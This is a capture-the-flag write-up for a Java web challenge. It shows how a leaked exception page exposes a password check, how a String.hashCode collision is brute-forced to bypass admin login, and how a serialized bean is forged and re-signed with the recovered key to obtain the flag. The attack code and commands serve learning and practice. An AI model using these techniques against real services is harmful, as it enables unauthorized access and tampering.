## Not My Cup of Coffee (Web, 300 points, 63 solves)

    I heard you liked food based problems, so here's a liquid one.


We are given a url for Passion Beans `where the true value of beans are preserved`. After checking the various web chal tricks we start looking at the actual page. On the page are a list of Beans with a Name, Description, Parent1, Parent2, and an inheritable flag. One of which is a bean called "Flag". Also on the page are two links, one to a page where you can breed two beans together, and another for an admin login.

Taking a look first at the breeding page we can create a new bean by giving it a name, description, and choosing two parents. The Parents are base64 encoded strings with an appended hash. We can verify the hash is a security feature by changing the input and testing. The correct base64 string and hash are indeed required. We also find that creating a bean with no description inherits the description from the parent. This is useful knowledge for the future. Based on the `.jsp` extension we correctly deduce these are serialized java objects. We can decode them and  gain more information about the backend via `jdeserialize` from google.

```bash
echo -n $1 | base64 -d > /tmp/jde
if [ ! -f /tmp/jdeserialize-1.2.jar ]; then
    wget "https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/jdeserialize/jdeserialize-1.2.jar" -O "/tmp/jdeserialize-1.2.jar"
fi
java -jar /tmp/jdeserialize-1.2.jar /tmp/jde
```

The second page to now investigate is the admin login. Entering some strings to test for vulnerabilities such as sql injection we get an error that `Only alphanumeric characters allowed`. The `/password.jsp` submits us to `/admin.jsp`. Purely accidentally browsing to various urls I went to `/admin.jsp` as a GET with no params. Giving us this helpful error output.

```java
Exception: org.apache.jasper.JasperException: An exception occurred processing [/admin.jsp] at line [28]

25:           String result;
26:           // NOTE: Change $ to s when page is ready
27:           auth.loadPassword("Pas$ion");
28:           if (!guess.matches("[A-Za-z0-9]+")) {
29:             result = "Only alphanumeric characters allowed";
30:           } else {
31:             result = auth.lookup(guess.hashCode());
32:           }
```

This expection page leaks a portion of the code. Allowing us to look for a vulnerability to access the admin page. We see the password is `Pas$ion` and the regex is verifying we only use alphanumeric charcters. Reading the reference documents for the various functions used we find that the java String function `matches` matches (_heh_) the entire string. Making the regex actually act like the pattern `^[A-Za-z0-9]+$`. This should be reasonably safe. So instead let's turn out attention to `hashCode`. A very quick search tells us just how unsafe this function is. We can easily brute-force collisions with some terrible java code. _Replacing only the $ didn't find any collisions so let's try both._

```java
int code = "Pas$ion".hashCode();
String str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
for (char c1 : str.toCharArray()) {
  for (char c2 : str.toCharArray()) {
    String s = "Pa" + c1 + c2 + "ion";
    if (code == s.hashCode()) {
      System.out.println(s);
    }
  }
}
```

This code gives a few options, the first of which is `Paqbion`. Entering this into the admin console presents us with a seemingly random string `c@ram31m4cchi@o`. This is of course the secret key used to verify the base64 encoded beans and can be verified with this one-liner bash script.

```bash
echo $1"c@ram31m4cchi@o" | hashalot -q -x sha256
```

With the secret key known for the sha256 calculation we should now have everything we need to spoof the Flag and create a new bean to obtain the flag. We'll use sed to replace the name of another four letter bean with the word _Flag_. We have a couple choices but I chose _Raid_.

```bash
ENCODED="rO0ABXNyAA9jb2ZmZWUuUmFpZEJlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZWUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAEUmFpZHBw"
FLAG=$(echo -n $ENCODED | base64 -d | sed 's/Raid/Flag/g' | base64 -w 0)
SHA256=$(echo $FLAG"c@ram31m4cchi@o" | hashalot -q -x sha256)
echo $FLAG-$SHA256
```

With our created bean and correct hash we can submit it and hope for a solve. Editing the html of the page using our browsers Inspector and submitting creates our new _Solve_ bean with the flag in the description!

`flag{yd1dw3wr1t3th15j@v@is@n@landd0nt51@lize}`
